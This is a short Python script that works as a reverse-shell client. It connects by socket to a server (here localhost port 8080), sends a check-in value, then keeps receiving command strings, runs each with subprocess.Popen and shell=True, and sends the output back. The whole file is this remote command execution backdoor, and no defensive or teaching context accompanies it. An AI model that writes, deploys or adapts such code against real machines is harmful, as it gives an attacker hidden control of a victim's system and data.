import socket
import subprocess
#Define client
Client=socket.socket()
#Connect to server
try:
    Client.connect(('localhost',8080))
    #Send message with value '1'
    Client.send("1".encode("ascii"))
    while True:
        #Command in bytes to run in server
        commandBytes=Client.recv(1024)
        #Decoded command
        commandDec=commandBytes.decode("ascii")
        #execute command in terminal
        command=subprocess.Popen(
            commandDec,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        #Send command to server
        Client.send(command.stdout.read())
except Exception as e:
    raise e

